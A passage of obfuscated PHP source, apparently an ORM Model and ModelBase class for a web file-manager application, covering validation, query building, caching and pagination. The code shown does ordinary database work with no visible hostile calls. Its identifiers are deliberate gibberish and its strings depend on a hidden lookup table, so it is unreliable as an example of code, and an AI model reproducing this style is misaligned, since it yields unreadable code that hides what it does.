isset($æïµœ¿â[3]) ? $æïµœ¿â[3] : THINK_EXISTS_VALIDATE; $æïµœ¿â[4] = isset($æïµœ¿â[4]) ? $æïµœ¿â[4] : $Ç—Ùİİ´[406]; switch ($æïµœ¿â[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($§¥³‘¥Â, $æïµœ¿â)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Ç—Ùİİ´[12] != trim($§¥³‘¥Â[$æïµœ¿â[0]])) { if (!1 === $this->_validationField($§¥³‘¥Â, $æïµœ¿â)) { return !1; } } break; default: if (isset($§¥³‘¥Â[$æïµœ¿â[0]])) { if (!1 === $this->_validationField($§¥³‘¥Â, $æïµœ¿â)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($“ã¿ŒÏ , $‘­è³×) { if (!1 === $this->_validationFieldItem($“ã¿ŒÏ , $‘­è³×)) { if ($this->patchValidate) { $this->error[$‘­è³×[0]] = $‘­è³×[2]; } else { $this->error = $‘­è³×[2]; return !1; } } return; } protected function _validationFieldItem($„Äâƒí, $ŞéÄÏ) { $é“Ú— =& $_SERVER[ÅÄÇĞô]; switch (strtolower(trim($ŞéÄÏ[4]))) { case $é“Ú—[399]: case $é“Ú—[400]: $©˜¿áö = isset($ŞéÄÏ[6]) ? (array) $ŞéÄÏ[6] : array(); if (is_string($ŞéÄÏ[0]) && strpos($ŞéÄÏ[0], $é“Ú—[50])) { $ŞéÄÏ[0] = explode($é“Ú—[50], $ŞéÄÏ[0]); } if (is_array($ŞéÄÏ[0])) { foreach ($ŞéÄÏ[0] as $Ÿ÷Ö«Ï¹) { $ûıÓÉÎÇ[$Ÿ÷Ö«Ï¹] = $„Äâƒí[$Ÿ÷Ö«Ï¹]; } array_unshift($©˜¿áö, $ûıÓÉÎÇ); } else { array_unshift($©˜¿áö, $„Äâƒí[$ŞéÄÏ[0]]); } if ($é“Ú—[399] == $ŞéÄÏ[4]) { return call_user_func_array($ŞéÄÏ[1], $©˜¿áö); } else { return call_user_func_array(array(&$this, $ŞéÄÏ[1]), $©˜¿áö); } case $é“Ú—[407]: return $„Äâƒí[$ŞéÄÏ[0]] == $„Äâƒí[$ŞéÄÏ[1]]; case $é“Ú—[408]: if (is_string($ŞéÄÏ[0]) && strpos($ŞéÄÏ[0], $é“Ú—[50])) { $ŞéÄÏ[0] = explode($é“Ú—[50], $ŞéÄÏ[0]); } $÷É¨Í“— = array(); if (is_array($ŞéÄÏ[0])) { foreach ($ŞéÄÏ[0] as $Ÿ÷Ö«Ï¹) { $÷É¨Í“—[$Ÿ÷Ö«Ï¹] = $„Äâƒí[$Ÿ÷Ö«Ï¹]; } } else { $÷É¨Í“—[$ŞéÄÏ[0]] = $„Äâƒí[$ŞéÄÏ[0]]; } if (!empty($„Äâƒí[$this->getPk()])) { $÷É¨Í“—[$this->getPk()] = array($é“Ú—[409], $„Äâƒí[$this->getPk()]); } if ($this->where($÷É¨Í“—)->find()) { return !1; } return !0; default: return $this->check($„Äâƒí[$ŞéÄÏ[0]], $ŞéÄÏ[1], $ŞéÄÏ[4]); } } public function check($¡ÕÑœµŞ, $©ÕÜ®…Æ, $ºœ¨²Û• = "\162\x65\147\145\x78") { $“ïíØ‡Ê =& $_SERVER[ÅÄÇĞô]; $ºœ¨²Û• = strtolower(trim($ºœ¨²Û•)); switch ($ºœ¨²Û•) { case $“ïíØ‡Ê[7]: case $“ïíØ‡Ê[410]: $ıºÔ¿ƒ = is_array($©ÕÜ®…Æ) ? $©ÕÜ®…Æ : explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ); return $ºœ¨²Û• == $“ïíØ‡Ê[7] ? in_array($¡ÕÑœµŞ, $ıºÔ¿ƒ) : !in_array($¡ÕÑœµŞ, $ıºÔ¿ƒ); case $“ïíØ‡Ê[411]: case $“ïíØ‡Ê[412]: if (is_array($©ÕÜ®…Æ)) { $¡½›ÚªÒ = $©ÕÜ®…Æ[0]; $©Ä£÷ = $©ÕÜ®…Æ[1]; } else { list($¡½›ÚªÒ, $©Ä£÷) = explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ); } return $ºœ¨²Û• == $“ïíØ‡Ê[411] ? $¡ÕÑœµŞ >= $¡½›ÚªÒ && $¡ÕÑœµŞ <= $©Ä£÷ : $¡ÕÑœµŞ < $¡½›ÚªÒ || $¡ÕÑœµŞ > $©Ä£÷; case $“ïíØ‡Ê[413]: case $“ïíØ‡Ê[414]: return $ºœ¨²Û• == $“ïíØ‡Ê[413] ? $¡ÕÑœµŞ == $©ÕÜ®…Æ : $¡ÕÑœµŞ != $©ÕÜ®…Æ; case $“ïíØ‡Ê[415]: $ô˜ïâì = mb_strlen($¡ÕÑœµŞ, $“ïíØ‡Ê[416]); if (strpos($©ÕÜ®…Æ, $“ïíØ‡Ê[50])) { list($¡½›ÚªÒ, $©Ä£÷) = explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ); return $ô˜ïâì >= $¡½›ÚªÒ && $ô˜ïâì <= $©Ä£÷; } else { return $ô˜ïâì == $©ÕÜ®…Æ; } case $“ïíØ‡Ê[417]: list($Á® ¿‹Î, $“œß¤µ¦) = explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ); if (!is_numeric($Á® ¿‹Î)) { $Á® ¿‹Î = strtotime($Á® ¿‹Î); } if (!is_numeric($“œß¤µ¦)) { $“œß¤µ¦ = strtotime($“œß¤µ¦); } return NOW_TIME >= $Á® ¿‹Î && NOW_TIME <= $“œß¤µ¦; case $“ïíØ‡Ê[418]: return in_array(get_client_ip(), explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ)); case $“ïíØ‡Ê[419]: return !in_array(get_client_ip(), explode($“ïíØ‡Ê[50], $©ÕÜ®…Æ)); case $“ïíØ‡Ê[406]: default: return $this->regex($¡ÕÑœµŞ, $©ÕÜ®…Æ); } } public function query($Â¬´ù–‡, $ì©Ú³šş = false) { $¥¨¾¦Ç =& $_SERVER[ÅÄÇĞô]; if (!is_bool($ì©Ú³šş) && !is_array($ì©Ú³šş)) { $ì©Ú³šş = func_get_args(); array_shift($ì©Ú³šş); } $Â¬´ù–‡ = str_replace(array($¥¨¾¦Ç[288], $¥¨¾¦Ç[420]), $¥¨¾¦Ç[53], $Â¬´ù–‡); $Â¬´ù–‡ = $this->parseSql($Â¬´ù–‡, $ì©Ú³šş); return $this->db->query($Â¬´ù–‡); } public function execute($’Î¬ñ“Û, $´‚ƒê÷Í = false) { if (!is_bool($´‚ƒê÷Í) && !is_array($´‚ƒê÷Í)) { $´‚ƒê÷Í = func_get_args(); array_shift($´‚ƒê÷Í); } $’Î¬ñ“Û = $this->parseSql($’Î¬ñ“Û, $´‚ƒê÷Í); return $this->db->execute($’Î¬ñ“Û); } protected function parseSql($Ùˆ¸µŒı, $äÀÇÍèî) { $ŠíÍ«Ü‚ =& $_SERVER[ÅÄÇĞô]; if (!0 === $äÀÇÍèî) { $©¬É¶¿± = $this->_parseOptions(); $Ùˆ¸µŒı = $this->db->parseSql($Ùˆ¸µŒı, $©¬É¶¿±); } elseif (is_array($äÀÇÍèî)) { $äÀÇÍèî = array_map(array($this->db, $ŠíÍ«Ü‚[421]), $äÀÇÍèî); $Ùˆ¸µŒı = vsprintf($Ùˆ¸µŒı, $äÀÇÍèî); } else { $Ùˆ¸µŒı = strtr($Ùˆ¸µŒı, array($ŠíÍ«Ü‚[422] => $this->getTableName(), $ŠíÍ«Ü‚[423] => think_config($ŠíÍ«Ü‚[324]))); } $this->db->setModel($this->name); return $Ùˆ¸µŒı; } public function db($ı˜ÑÙ = '', $˜½®§­ï = '', $÷­£—¸Ğ = array()) { $Æ¹ª¬“é =& $_SERVER[ÅÄÇĞô]; if ($Æ¹ª¬“é[12] === $ı˜ÑÙ && $this->db) { return $this->db; } static $¥ªÇ˜ùº = array(); static $ôúı¬Î = array(); if (!isset($ôúı¬Î[$ı˜ÑÙ]) || isset($ôúı¬Î[$ı˜ÑÙ]) && $˜½®§­ï && $¥ªÇ˜ùº[$ı˜ÑÙ] != $˜½®§­ï) { if (!empty($˜½®§­ï) && is_string($˜½®§­ï) && !1 === strpos($˜½®§­ï, $Æ¹ª¬“é[8])) { $˜½®§­ï = think_config($˜½®§­ï); } $ı˜ÑÙ = think_guid($˜½®§­ï); $ôúı¬Î[$ı˜ÑÙ] = Db::getInstance($˜½®§­ï); } elseif (NULL === $˜½®§­ï) { $ôúı¬Î[$ı˜ÑÙ]->close(); unset($ôúı¬Î[$ı˜ÑÙ]); return; } if (!empty($÷­£—¸Ğ)) { if (is_string($÷­£—¸Ğ)) { parse_str($÷­£—¸Ğ, $÷­£—¸Ğ); } foreach ($÷­£—¸Ğ as $Ÿ¿‡ƒ‘ => $ŒùÖ°«ˆ) { $this->setProperty($Ÿ¿‡ƒ‘, $ŒùÖ°«ˆ); } } $¥ªÇ˜ùº[$ı˜ÑÙ] = $˜½®§­ï; $this->db = $ôúı¬Î[$ı˜ÑÙ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ŞşûÃîç = get_class($this); if ($ŞşûÃîç == $_SERVER[ÅÄÇĞô][424]) { return $this->name; } $this->name = substr($ŞşûÃîç, 0, -5); } return $this->name; } public function getTableName() { $àåöåõÂ =& $_SERVER[ÅÄÇĞô]; if (empty($this->trueTableName)) { $Íõñ¡šõ = !empty($this->tablePrefix) ? $this->tablePrefix : $àåöåõÂ[12]; if (!empty($this->tableName)) { $Íõñ¡šõ .= $this->tableName; } else { $Íõñ¡šõ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Íõñ¡šõ); } return (!empty($this->dbName) ? $this->dbName . $àåöåõÂ[10] : $àåöåõÂ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $µüú =& $_SERVER[ÅÄÇĞô]; return isset($this->fields[$µüú[331]]) ? $this->fields[$µüú[331]] : $this->pk; } public function getDbFields() { $£Šü¸ÀÈ =& $_SERVER[ÅÄÇĞô]; if (isset($this->options[$£Šü¸ÀÈ[359]])) { $å„À íÁ = $this->db->getFields($this->options[$£Šü¸ÀÈ[359]]); return $å„À íÁ ? array_keys($å„À íÁ) : !1; } if ($this->fields) { $å„À íÁ = $this->fields; unset($å„À íÁ[$£Šü¸ÀÈ[330]], $å„À íÁ[$£Šü¸ÀÈ[331]], $å„À íÁ[$£Šü¸ÀÈ[332]], $å„À íÁ[$£Šü¸ÀÈ[329]]); return $å„À íÁ; } return !1; } public function data($¾¶»ì¯ = '') { $¥£ëøÎÆ =& $_SERVER[ÅÄÇĞô]; if ($¥£ëøÎÆ[12] === $¾¶»ì¯ && !empty($this->data)) { return $this->data; } if (is_object($¾¶»ì¯)) { $¾¶»ì¯ = get_object_vars($¾¶»ì¯); } elseif (is_string($¾¶»ì¯)) { parse_str($¾¶»ì¯, $¾¶»ì¯); } elseif (!is_array($¾¶»ì¯)) { think_exception(think_lang($¥£ëøÎÆ[351])); } $this->data = $¾¶»ì¯; return $this; } public function join($üÙâñÚ) { $³ÑÛå† =& $_SERVER[ÅÄÇĞô]; if (is_array($üÙâñÚ)) { $this->options[$³ÑÛå†[362]] = $üÙâñÚ; } elseif (!empty($üÙâñÚ)) { $this->options[$³ÑÛå†[362]][] = $üÙâñÚ; } return $this; } public function union($î¶÷£Š©, $¾¼ğÆ¡ó = false) { $÷Şáóı =& $_SERVER[ÅÄÇĞô]; if (empty($î¶÷£Š©)) { return $this; } if ($¾¼ğÆ¡ó) { $this->options[$÷Şáóı[425]][$÷Şáóı[426]] = !0; } if (is_object($î¶÷£Š©)) { $î¶÷£Š© = get_object_vars($î¶÷£Š©); } if (is_string($î¶÷£Š©)) { $ä©ƒŒù¼ = $î¶÷£Š©; } elseif (is_array($î¶÷£Š©)) { if (isset($î¶÷£Š©[0])) { $this->options[$÷Şáóı[425]] = array_merge($this->options[$÷Şáóı[425]], $î¶÷£Š©); return $this; } else { $ä©ƒŒù¼ = $î¶÷£Š©; } } else { think_exception(think_lang($÷Şáóı[351])); } $this->options[$÷Şáóı[425]][] = $ä©ƒŒù¼; return $this; } public function cache($ş×ŠöÌ¢ = true, $’‚Ÿ¡üá = null, $ÙŞºêâÙ = '') { $øŸˆ•í² =& $_SERVER[ÅÄÇĞô]; if (!1 !== $ş×ŠöÌ¢) { $this->options[$øŸˆ•í²[427]] = array($øŸˆ•í²[97] => $ş×ŠöÌ¢, $øŸˆ•í²[417] => $’‚Ÿ¡üá, $øŸˆ•í²[33] => $ÙŞºêâÙ); } return $this; } public function field($Å¨Ùõ¸Ä, $áÁê­Ş  = false) { $àÕˆ¬à´ =& $_SERVER[ÅÄÇĞô]; if (!0 === $Å¨Ùõ¸Ä) { $õ€æªœ  = $this->getDbFields(); $Å¨Ùõ¸Ä = $õ€æªœ  ? $õ€æªœ  : $àÕˆ¬à´[223]; } elseif ($áÁê­Ş ) { if (is_string($Å¨Ùõ¸Ä)) { $Å¨Ùõ¸Ä = explode($àÕˆ¬à´[50], $Å¨Ùõ¸Ä); } $õ€æªœ  = $this->getDbFields(); $Å¨Ùõ¸Ä = $õ€æªœ  ? array_diff($õ€æªœ , $Å¨Ùõ¸Ä) : $Å¨Ùõ¸Ä; } $this->options[$àÕˆ¬à´[353]] = $Å¨Ùõ¸Ä; return $this; } public function scope($ùÏĞ±õñ = '', $º†®ûÏ = NULL) { $êç¦”× =& $_SERVER[ÅÄÇĞô]; if ($êç¦”×[12] === $ùÏĞ±õñ) { if (isset($this->_scope[$êç¦”×[37]])) { $×–Ûôáñ = $this->_scope[$êç¦”×[37]]; } else { return $this; } } elseif (is_string($ùÏĞ±õñ)) { $ú›©×— = explode($êç¦”×[50], $ùÏĞ±õñ); $×–Ûôáñ = array(); foreach ($ú›©×— as $¦ı¦‹Ö) { if (!isset($this->_scope[$¦ı¦‹Ö])) { continue; } $×–Ûôáñ = array_merge($×–Ûôáñ, $this->_scope[$¦ı¦‹Ö]); } if (!empty($º†®ûÏ) && is_array($º†®ûÏ)) { $×–Ûôáñ = array_merge($×–Ûôáñ, $º†®ûÏ); } } elseif (is_array($ùÏĞ±õñ)) { $×–Ûôáñ = $ùÏĞ±õñ; } if (is_array($×–Ûôáñ) && !empty($×–Ûôáñ)) { $this->options = array_merge($this->options, array_change_key_case($×–Ûôáñ)); } return $this; } public function where($öÓ¸†ê•, $¦ŒÚïñ© = null) { $š»Ê÷Ù³ =& $_SERVER[ÅÄÇĞô]; if (!is_null($¦ŒÚïñ©) && is_string($öÓ¸†ê•)) { if (!is_array($¦ŒÚïñ©)) { $¦ŒÚïñ© = func_get_args(); array_shift($¦ŒÚïñ©); } $¦ŒÚïñ© = array_map(array($this->db, $š»Ê÷Ù³[421]), $¦ŒÚïñ©); $öÓ¸†ê• = vsprintf($öÓ¸†ê•, $¦ŒÚïñ©); } elseif (is_object($öÓ¸†ê•)) { $öÓ¸†ê• = get_object_vars($öÓ¸†ê•); } elseif (is_array($öÓ¸†ê•)) { foreach ($öÓ¸†ê• as $­‚¡ÉÔª => $©£Ä¥–ä) { if ((is_numeric($­‚¡ÉÔª) || !$­‚¡ÉÔª) && is_string($©£Ä¥–ä)) { if (strpos($©£Ä¥–ä, $š»Ê÷Ù³[428]) === 0) { continue; } think_trace($š»Ê÷Ù³[429], $š»Ê÷Ù³[12], $š»Ê÷Ù³[49]); die; } } } if (is_string($öÓ¸†ê•) && $š»Ê÷Ù³[12] != $öÓ¸†ê•) { $ñ±Ì„íÀ = array(); $ñ±Ì„íÀ[$š»Ê÷Ù³[430]] = $öÓ¸†ê•; $öÓ¸†ê• = $ñ±Ì„íÀ; } if (isset($this->options[$š»Ê÷Ù³[355]])) { $this->options[$š»Ê÷Ù³[355]] = array_merge($this->options[$š»Ê÷Ù³[355]], $öÓ¸†ê•); } else { $this->options[$š»Ê÷Ù³[355]] = $öÓ¸†ê•; } return $this; } public function limit($¸‚Ë²±¬, $¢Èñ‰µ = null) { $‚©ßïÎË =& $_SERVER[ÅÄÇĞô]; $this->options[$‚©ßïÎË[370]] = is_null($¢Èñ‰µ) ? $¸‚Ë²±¬ : $¸‚Ë²±¬ . $‚©ßïÎË[50] . $¢Èñ‰µ; return $this; } public function page($‘ã“¿ÒÆ, $…²æáøê = null) { $Ã¸·åÇµ =& $_SERVER[ÅÄÇĞô]; $this->options[$Ã¸·åÇµ[431]] = is_null($…²æáøê) ? $‘ã“¿ÒÆ : $‘ã“¿ÒÆ . $Ã¸·åÇµ[50] . $…²æáøê; return $this; } public function comment($Õ“²›ÛÌ) { $this->options[$_SERVER[ÅÄÇĞô][432]] = $Õ“²›ÛÌ; return $this; } public function setProperty($É€õÕâü, $…‡éÖ¬½) { if (property_exists($this, $É€õÕâü)) { $this->{$É€õÕâü} = $…‡éÖ¬½; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\x79\124\151\155\145", "\x74\x69\155\145", "\x69\156\x73\x65\x72\164\x2c\x75\x70\144\141\x74\145", "\146\x75\156\143\x74\x69\157\156"), array("\143\162\145\x61\x74\x65\124\151\155\x65", "\164\x69\155\145", "\151\156\163\145\x72\x74", "\146\x75\156\143\164\151\x6f\x6e")); public function setDataAuto($ÚÎôëÑ) { $this->dataAuto = $ÚÎôëÑ; } public function __construct($ñØËô¬ = '', $‡¦º÷©‚ = '', $†”’İ­¾ = '') { parent::__construct($ñØËô¬, $‡¦º÷©‚, $†”’İ­¾); } protected $tableMeta = array(); protected function _beforeInsert(&$Ã—‰úØ, $µ×÷Ê“”) { $×»¯×õ =& $_SERVER[ÅÄÇĞô]; if (!$this->checkDataAutoHas($×»¯×õ[433])) { return; } $this->dataBeforeFilter($Ã—‰úØ, $×»¯×õ[433]); } protected function _beforeUpdate(&$¸äİ†Å•, $¼ÄšÜÕ) { $ß–¢™ÔÄ =& $_SERVER[ÅÄÇĞô]; if (!$this->checkDataAutoHas($ß–¢™ÔÄ[434])) { return; } $this->dataBeforeFilter($¸äİ†Å•, $ß–¢™ÔÄ[434]); } protected function _afterSelect(&$ÊæÈÅ’µ, $Ó£­™Ğú) { if (!is_array($ÊæÈÅ’µ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÅÄÇĞô][435])) { return; } foreach ($ÊæÈÅ’µ as &$ì”©¾¿Š) { $this->dataAfterFilter($ì”©¾¿Š); } unset($ì”©¾¿Š); } protected function _afterFind(&$èĞòü§¿, $ğİÍ¿…) { if (!is_array($èĞòü§¿)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÅÄÇĞô][435])) { return; } $this->dataAfterFilter($èĞòü§¿); } public static function textEncode($ëæ†’è) { if (!$ëæ†’è) { return $ëæ†’è; } $èµÅÌÇ = json_encode($ëæ†’è); $èµÅÌÇ = preg_replace_callback($_SERVER[ÅÄÇĞô][436], function ($ˆ‚üó¢) { return addslashes($ˆ‚üó¢[0]); }, $èµÅÌÇ); return json_decode($èµÅÌÇ); } public static function textDecode($˜ƒ†”æ„) { $ß®²’õæ =& $_SERVER[ÅÄÇĞô]; $ä¦ï˜‡ñ = json_encode($˜ƒ†”æ„); $ä¦ï˜‡ñ = preg_replace_callback($ß®²’õæ[437], function ($´¨İú‡¼) { return $_SERVER[ÅÄÇĞô][100]; }, $ä¦ï˜‡ñ); return json_decode($ä¦ï˜‡ñ); } public function setAutoIncrement($Ó—¹ÙèÓ) { $˜î®Œ¦ù = array($this->getPk() => $Ó—¹ÙèÓ); $¯Âå¦’  = $this->data($˜î®Œ¦ù)->add(); if ($¯Âå¦’ ) { $this->delete($¯Âå¦’ ); } } public function getAutoIncrement() { $ë—Ò©¹à = $this->getTableName(); $™ü×Çç = $this->max($this->getPk()); $ûğùÀÇà = $this->query("\x73\x68\157\167\40\x74\x61\x62\154\145\x20\x73\164\141\x74\165\x73\x20\x77\x68\145\x72\x65\x20\x4e\141\x6d\145\75\47{$ë—Ò©¹à}\47"); $ş£ø•Õ” = $ûğùÀÇà[0][$_SERVER[ÅÄÇĞô][438]]; $—±ë³¶Ó = max($™ü×Çç, $ş£ø•Õ”); return $—±ë³¶Ó; } protected function _callBefore($÷áäË«ê, $²í«¬Ø) { return $this->cacheCallCheck($÷áäË«ê, $²í«¬Ø, !1); } protected function _callAfter($«©¹ÊÌ‚, $â¹È•ëã) { return $this->cacheCallCheck($«©¹ÊÌ‚, $â¹È•ëã, !0); } protected function cacheFunctionAlias($Œ¥µ·Á¨) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($£¥âºÇ, $ğ“šØá÷, $Ë¤üºŸ» = false) { $ñ¡ß²äº =& $_SERVER[ÅÄÇĞô]; $¹±ğ©„¢ = $this->cacheFunctionAlias($ğ“šØá÷); if (!$¹±ğ©„¢) { return; } foreach ($¹±ğ©„¢ as $Ó¯ÙŒĞÏ => $è‡Ïø¦Õ) { $ÜŠŒÚªâ = $è‡Ïø¦Õ[0]; $£¦òñôù = explode($ñ¡ß²äº[50], $è‡Ïø¦Õ[1]); $À»Ÿ‘Ëß = isset($è‡Ïø¦Õ[2]) ? $è‡Ïø¦Õ[2] : $ñ¡ß²äº[12]; if ($£¥âºÇ == $Ó¯ÙŒĞÏ) { return $this->cacheFunctionGet($Ó¯ÙŒĞÏ, $ÜŠŒÚªâ, $À»Ÿ‘Ëß); } if ($Ë¤üºŸ» && in_array($£¥âºÇ, $£¦òñôù)) { $this->cacheFunctionClear($Ó¯ÙŒĞÏ, $ÜŠŒÚªâ, $À»Ÿ‘Ëß); } } } public function cacheFunctionGet($íÍä›ê, $¢Ğş´â—, $å——“¡ş = '') { $äêí‘‹ = $this->cacheKeyMake($íÍä›ê, $¢Ğş´â—, $å——“¡ş); $èÔ’±ãò = Cache::get($äêí‘‹); if (!is_array($èÔ’±ãò)) { $èÔ’±ãò = call_user_func_array(array($this, $íÍä›ê), array($¢Ğş´â—, !0)); Cache::set($äêí‘‹, $èÔ’±ãò); } return $èÔ’±ãò; } public function cacheFunctionClear($æ€»«ç, $…¦Éş, $‹ÏØ¬Éï = '') { $ß·¦ëåš = $…¦Éş; if (!is_array($…¦Éş)) { $ß·¦ëåš = array($…¦Éş); } foreach ($ß·¦ëåš as $êä²¬‰˜) { $í ªØ = $this->cacheKeyMake($æ€»«ç, $êä²¬‰˜, $‹ÏØ¬Éï); Cache::remove($í ªØ); } } public function cacheKeyMake($„ôÏí«, $÷ŞØÃ, $»¦ÔÛ¢œ) { $‰Å€ ÜÒ =& $_SERVER[ÅÄÇĞô]; if ($»¦ÔÛ¢œ) { $÷ŞØÃ = $÷ŞØÃ . $‰Å€ ÜÒ[439] . $»¦ÔÛ¢œ; } return get_class($this) . $‰Å€ ÜÒ[11] . $„ôÏí« . $‰Å€ ÜÒ[440] . $÷ŞØÃ; } protected function selectPageReset() { $ÜĞãÍª” =& $_SERVER[ÅÄÇĞô]; if (isset($GLOBALS[$ÜĞãÍª”[441]])) { return; } $GLOBALS[$ÜĞãÍª”[441]] = isset($GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[442]]) ? $GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[442]] : !1; $GLOBALS[$ÜĞãÍª”[443]] = isset($GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[431]]) ? $GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[431]] : !1; $GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[442]] = !1; $GLOBALS[$ÜĞãÍª”[7]][$ÜĞãÍª”[431]] = !1; } protected function selectPageRestore() { $Ÿ‰–¸´ =& $_SERVER[ÅÄÇĞô]; if (!isset($GLOBALS[$Ÿ‰–¸´[441]])) { return; } $GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[442]] = $GLOBALS[$Ÿ‰–¸´[441]]; $GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[431]] = $GLOBALS[$Ÿ‰–¸´[443]]; if ($GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[442]] === !1) { unset($GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[442]]); } if ($GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[431]] === !1) { unset($GLOBALS[$Ÿ‰–¸´[7]][$Ÿ‰–¸´[431]]); } unset($GLOBALS[$Ÿ‰–¸´[441]]); unset($GLOBALS[$Ÿ‰–¸´[443]]); } protected function selectPage($¿ÏÏ¾Úè = 200, $‰“²áÏÛ = 1) { $É“ÊŒÑî =& $_SERVER[ÅÄÇĞô]; global $in; $“¨—ù×¶ = $this->optionsValue(); $¿ˆÊÄ£ˆ = 50000; $¿ÏÏ¾Úè = isset($in[$É“ÊŒÑî[442]]) && $in[$É“ÊŒÑî[442]] ? $in[$É“ÊŒÑî[442]] : $¿ÏÏ¾Úè; if ($¿ÏÏ¾Úè === -1) { $in[$É“ÊŒÑî[442]] = !1; $¿ˆÊÄ£ˆ = 100000000; $¿ÏÏ¾Úè = $¿ˆÊÄ£ˆ; } $Ä•ıÒñö = $“¨—ù×¶; $Ä•ıÒñö[$É“ÊŒÑî[444]] = array(); $¿ÏÏ¾Úè = intval($¿ÏÏ¾Úè); $¿ÏÏ¾Úè = $¿ÏÏ¾Úè <= 5 ? 5 : ($¿ÏÏ¾Úè >= $¿ˆÊÄ£ˆ ? $¿ˆÊÄ£ˆ : $¿ÏÏ¾Úè); $‰“²áÏÛ = intval(isset($in[$É“ÊŒÑî[431]]) && $in[$É“ÊŒÑî[431]] ? $in[$É“ÊŒÑî[431]] : $‰“²áÏÛ); $‰“²áÏÛ = $‰“²áÏÛ <= 1 ? 1 : $‰“²áÏÛ; $„Ô§”‘œ = array(); $ÖŸ§†¢ù = 1; if ($‰“²áÏÛ == 1 && $ÖŸ§†¢ù) { $this->optionsValue($“¨—ù×¶); $„Ô§”‘œ = $this->page($‰“²áÏÛ, $¿ÏÏ¾Úè)->select(); $¤à§õ£ = is_array($„Ô§”‘œ) ? count($„Ô§”‘œ) : 0; if ($¤à§õ£ < $¿ÏÏ¾Úè) { $æÚªí¦Î = 1; } else { $this->optionsValue($Ä•ıÒñö); $¤à§õ£ = intval($this->count()); $æÚªí¦Î = ceil($¤à§õ£ / $¿ÏÏ¾Úè); } } else { $this->optionsValue($Ä•ıÒñö); $¤à§õ£ = intval($this->count()); $æÚªí¦Î = ceil($¤à§õ£ / $¿ÏÏ¾Úè); $‰“²áÏÛ = $‰“²áÏÛ >= $æÚªí¦Î ? $æÚªí¦Î : $‰“²áÏÛ; $this->optionsValue($“¨—ù×¶); $„Ô§”‘œ = $this->page($‰“²áÏÛ, $¿ÏÏ¾Úè)->select(); } if (!is_array($„Ô§”‘œ)) { $„Ô§”‘œ = array(); } if ($æÚªí¦Î == 1) { $¤à§õ£ = count($„Ô§”‘œ); } $êëßÁîŞ = array($É“ÊŒÑî[445] => array($É“ÊŒÑî[446] => $¤à§õ£, $É“ÊŒÑî[442] => $¿ÏÏ¾Úè, $É“ÊŒÑî[431] => $‰“²áÏÛ, $É“ÊŒÑî[447] => $æÚªí¦Î), $É“ÊŒÑî[448] => $„Ô§”‘œ); return $êëßÁîŞ; } protected function checkLength($å •Î¼, $ŒÍİÅÑ = 0, $Ù£ìİ®› = '') { $¸ôº¯èˆ =& $_SERVER[ÅÄÇĞô]; $ŒÍİÅÑ = $ŒÍİÅÑ ? $ŒÍİÅÑ : 65536; if (!$å •Î¼ || strlen($å •Î¼) < $ŒÍİÅÑ) { return; } $Ù£ìİ®› = $Ù£ìİ®› ? $Ù£ìİ®› . $¸ôº¯èˆ[74] : $¸ôº¯èˆ[12]; show_json($Ù£ìİ®› . LNG($¸ôº¯èˆ[449]) . "\50{$ŒÍİÅÑ}\51", !1); } protected function metaSet($·ŸŞæ£Ø, $¡ú“µ­Ä = null, $ùÄÊÂ€‰ = null) { $Òƒ“†›ß =& $_SERVER[ÅÄÇĞô]; if (!$this->tableMeta || !$·ŸŞæ£Ø) { return !1; } $Å¯İÇ‹ = $this->tableMeta[$Òƒ“†›ß[450]]; $Ÿ±ü¨Æ‘ = $this->tableMeta[$Òƒ“†›ß[451]]; $éÆóÚö¢ = Model($Ÿ±ü¨Æ‘); $ÁÅ†¢•î = array($Å¯İÇ‹ => $·ŸŞæ£Ø, $Òƒ“†›ß[452] => $¡ú“µ­Ä); if (is_null($¡ú“µ­Ä)) { return $éÆóÚö¢->where(array($Å¯İÇ‹ => $·ŸŞæ£Ø))->delete(); } if (is_null($ùÄÊÂ€‰) && is_string($¡ú“µ­Ä)) { return $éÆóÚö¢->where($ÁÅ†¢•î)->delete(); } $‹ÒŒÄğ² = is_array($¡ú“µ­Ä) ? $¡ú“µ­Ä : array(); if (is_string($¡ú“µ­Ä)) { $‹ÒŒÄğ²[$¡ú“µ­Ä] = $ùÄÊÂ€‰; } $¥™³Íñ÷ = array(); foreach ($‹ÒŒÄğ² as $³¿‹²’ => $µ¨™ÏÅÎ) { if (is_null($µ¨™ÏÅÎ) && is_string($³¿‹²’)) { $éÆóÚö¢->where(array($Å¯İÇ‹ => $·ŸŞæ£Ø, $Òƒ“†›ß[452] => $³¿‹²’))->delete(); continue; } $this->checkLength($µ¨™ÏÅÎ, !1, $Ÿ±ü¨Æ‘ . $Òƒ“†›ß[4] . $³¿‹²’); $¥™³Íñ÷[] 